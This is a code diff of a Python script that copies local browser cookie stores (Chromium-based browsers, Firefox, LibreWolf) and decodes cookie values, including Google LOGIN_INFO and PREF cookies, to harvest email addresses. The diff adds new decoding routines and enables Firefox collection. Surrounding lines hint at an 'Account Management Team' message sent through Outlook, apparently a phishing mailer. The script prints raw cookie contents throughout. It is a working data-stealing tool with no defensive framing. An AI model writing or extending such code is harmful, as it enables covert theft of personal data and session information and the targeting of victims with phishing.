@@ -19,6 +19,7 @@ from email import encoders
 import ssl
 import urllib.parse
 from charset_normalizer import from_bytes
+from chardet import detect
 import plyvel
 import snappy
 import json
@@ -27,6 +28,8 @@ USERNAME = getpass.getuser()
 CHROME_BROWSER = 'chrome'
 EDGE_BROWSER = 'edge'
 BRAVE_BROWSER = 'brave'
+FIREFOX_BROWSER = 'firefox'
+LIBREWOLF_BROWSER = 'librewolf'
 OPERAGX = 'operagx'
 OPERA_BROWSER = 'opera'
 chrome_path  = os.path.join(os.getenv('LOCALAPPDATA'),'Google', 'Chrome', 'User Data')
@@ -164,12 +167,20 @@ Account Management Team"""
     print(len(emails))
 
 def decode_with_fallback(data):
-    for encoding in ['utf-8', 'utf-16-le', 'latin-1']:
+    for encoding in ['utf-8', 'utf-16-le']:
         try:
             return data.decode(encoding), encoding
         except:
             continue
-    encoding = from_bytes(data).best().encoding or 'utf-8'
+    try:
+        encoding = from_bytes(data).best().encoding
+        return data.decode(encoding), encoding
+    except: pass
+    try:
+        encoding = detect(data)['encoding']
+        return data.decode(encoding), encoding
+    except: pass
+    encoding = 'latin-1'
     return data.decode(encoding, errors='replace'), encoding
 
 def bytes_to_hex(byte_data):
@@ -387,7 +398,9 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                     decoded = cookie.value
                     # print(f"{cookie.name} ::: {decoded}", '\n')
                     # url decoding
-                    try: decoded = urllib.parse.unquote(decoded)
+                    try:
+                        decoded = urllib.parse.unquote(decoded)
+                        emails.extend(re.findall(email_pattern, decoded))
                     except Exception as e: print(f"ERROR URL DECODING : {e}")
 
                     if cookie.name == "PREF":
@@ -395,6 +408,7 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                         try:
                             c = urllib.parse.parse_qs(decoded)
                             emails.extend(find_emails_in_json(json.loads(json.dumps(c)), email_pattern))
+                            print(f"COMPLETE PREFFF : {json.dumps(c)}")
                             continue
                         except Exception as e: print(f"ERROR IN PARSING PREF : {e}")
                             
@@ -404,7 +418,25 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                             sig, b64_dat = decoded.split(':')
                             b64_dat, _ = decode_with_fallback(base64.b64decode(b64_dat, validate=True))
                             emails.extend(re.findall(email_pattern, b64_dat))
+                            print(f"COMPLETE PARSING LOGIN INFO : {b64_dat}")
+                            continue
                         except Exception as e: print(f"ERROR IN LOGIN INFO PARSING : {e}")
+
+                    for delim in ['.', '-', '~', '=']:
+                        if delim in decoded:
+                            chunks = decoded.split(delim)
+                            for chunk in chunks:
+                                try:
+                                    chunk = urllib.parse.unquote(chunk)
+                                    decoded_string, decoding = decode_with_fallback(base64.b64decode(chunk, validate=True))
+                                    print(f"used delimiter {delim} for chunk {chunk} : used {decoding} and value {decoded_string}")
+
+                                    if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
+                                        print(f"IS ACTUALLY A JSON FOR CHUNK {decoded_string}")
+                                        emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
+
+                                    else: emails.extend(re.findall(email_pattern, decoded_string))
+                                except: pass
 
                     #base64 decoding
                     try:
@@ -416,11 +448,12 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                             continue
                         else: emails.extend(re.findall(email_pattern, decoded_string))
                             
-                    except Exception as e: print(f"ERROR in BASE64 decoding : {e}")
+                    except Exception as e: pass#print(f"ERROR in BASE64 decoding : {e}")
 
                     #json decoding
                     try:
                         if decoded.strip().startswith('{') or decoded.strip().startswith('['):
+                            print(f"IS JSON FOR {cookie.name} : {decoded}")
                             emails.extend(find_emails_in_json(json.loads(decoded), email_pattern))
                             continue
                     except Exception as e:
@@ -447,7 +480,7 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
 
     return emails
 
-def firefox(firefox_path, email_pattern):
+def firefox(firefox_path, email_pattern, browser_name):
     emails = []
     for profile in os.listdir(firefox_path):
         profile_name = profile.replace(" ", "_")
@@ -476,16 +509,90 @@ def firefox(firefox_path, email_pattern):
         
         if os.path.exists(ck):
             os.system(f'copy "{ck}" "{tck}"')
-            conn = sqlite3.connect(tck)
-            cur = conn.cursor()
-            cur.execute("SELECT value FROM moz_cookies WHERE value LIKE '%@%'")
-            for val in cur.fetchall():
-                try:
-                    matches = re.findall(email_pattern, val[0])
-                    emails.extend(matches)
-                except:
-                    pass
-            conn.close()
+            try:
+                if browser_name == FIREFOX_BROWSER: cookies = browser_cookie3.firefox(cookie_file=tck)
+                elif browser_name == LIBREWOLF_BROWSER: cookies = browser_cookie3.librewolf(cookie_file=tck)
+                print(browser_name, ck, tck)
+                for cookie in cookies:
+                    decoded = cookie.value
+                    print(f"{cookie.name} ::: {decoded}", '\n')
+                    # url decoding
+                    try:
+                        decoded = urllib.parse.unquote(decoded)
+                        emails.extend(re.findall(email_pattern, decoded))
+                    except Exception as e: print(f"ERROR URL DECODING : {e}")
+
+                    if cookie.name == "PREF":
+                        print("ENTER PREFF")
+                        try:
+                            c = urllib.parse.parse_qs(decoded)
+                            emails.extend(find_emails_in_json(json.loads(json.dumps(c)), email_pattern))
+                            print(f"COMPLETE PREFFF : {json.dumps(c)}")
+                            continue
+                        except Exception as e: print(f"ERROR IN PARSING PREF : {e}")
+                            
+                    if cookie.name == "LOGIN_INFO":
+                        print("ENTER LOGIN INFO")
+                        try:
+                            sig, b64_dat = decoded.split(':')
+                            b64_dat, _ = decode_with_fallback(base64.b64decode(b64_dat, validate=True))
+                            emails.extend(re.findall(email_pattern, b64_dat))
+                            print(f"COMPLETE PARSING LOGIN INFO : {b64_dat}")
+                            continue
+                        except Exception as e: print(f"ERROR IN LOGIN INFO PARSING : {e}")
+
+                    for delim in ['.', '-', '~', '=']:
+                        if delim in decoded:
+                            chunks = decoded.split(delim)
+                            for chunk in chunks:
+                                try:
+                                    if len(chunk) % 4 != 0: chunk += (4 - (len(chunk) % 4)) * '='
+                                    chunk = urllib.parse.unquote(chunk)
+                                    decoded_string, decoding = decode_with_fallback(base64.b64decode(chunk, validate=True))
+                                    print(f"used delimiter {delim} for chunk {chunk} : used {decoding} and value {decoded_string}")
+
+                                    if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
+                                        print(f"IS ACTUALLY A JSON FOR CHUNK {decoded_string}")
+                                        emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
+
+                                    else: emails.extend(re.findall(email_pattern, decoded_string))
+                                except Exception as e: print(f"ERROR in decoding with bas64 or url for delim {delim}: {e} for chunk {chunk}") 
+
+                    #base64 decoding
+                    try:
+                        decoded_string, decoding = decode_with_fallback(base64.b64decode(decoded, validate=True))
+                        print(f"decoded with -> {decoding} and value -> {decoded_string}")
+
+                        if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
+                            emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
+                            continue
+                        else: emails.extend(re.findall(email_pattern, decoded_string))
+                            
+                    except Exception as e: pass#print(f"ERROR in BASE64 decoding : {e}")
+
+                    #json decoding
+                    try:
+                        if decoded.strip().startswith('{') or decoded.strip().startswith('['):
+                            print(f"IS JSON FOR {cookie.name} : {decoded}")
+                            emails.extend(find_emails_in_json(json.loads(decoded), email_pattern))
+                            continue
+                    except Exception as e:
+                        print(f"ERROR in json DECODING : {e}")
+
+                    emails.extend(re.findall(email_pattern, decoded))
+
+            except Exception as e:
+                print(f"ERROR USING BROWSER_COOKIE3 : {e}\nUsing normal sqlite query instead.")
+                conn = sqlite3.connect(tck)
+                cur = conn.cursor()
+                cur.execute("SELECT value FROM moz_cookies WHERE value LIKE '%@%'")
+                for val in cur.fetchall():
+                    try:
+                        matches = re.findall(email_pattern, val[0])
+                        emails.extend(matches)
+                    except:
+                        pass
+                conn.close()
 
         if os.path.exists(bh):
             os.system(f'copy "{bh}" "{tbh}"')
@@ -605,20 +712,20 @@ emails = []
 
 # if os.path.exists(chrome_path): chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
 # if os.path.exists(edge_path): edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
-# if os.path.exists(firefox_path): firefox_emails = firefox(firefox_path, email_pattern)
+if os.path.exists(firefox_path): firefox_emails = firefox(firefox_path, email_pattern, FIREFOX_BROWSER)
 # if os.path.exists(thunderbird_path): thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
 # if os.path.exists(brave_path): brave_emails = chromEdgeOnly(brave_path, email_pattern, BRAVE_BROWSER)
-if os.path.exists(operagx_path): gx_emails = chromEdgeOnly(operagx_path, email_pattern, OPERAGX, isoperagx=True)
-if os.path.exists(opera_path) : opera_mails = chromEdgeOnly(opera_path, email_pattern, OPERA_BROWSER, isdecryptable=True)
+# if os.path.exists(operagx_path): gx_emails = chromEdgeOnly(operagx_path, email_pattern, OPERAGX, isoperagx=True)
+# if os.path.exists(opera_path) : opera_mails = chromEdgeOnly(opera_path, email_pattern, OPERA_BROWSER, isdecryptable=True)
 
 # # emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
 # emails.extend(chrome_emails)
 # emails.extend(edge_emails)
-# emails.extend(firefox_emails)
+emails.extend(firefox_emails)
 # emails.extend(thunderbird_emails)
 # emails.extend(brave_emails)
-emails.extend(gx_emails)
-emails.extend(opera_mails)
+# semails.extend(gx_emails)
+# semails.extend(opera_mails)
 
 try:
     # Method 1: Outlook COM API
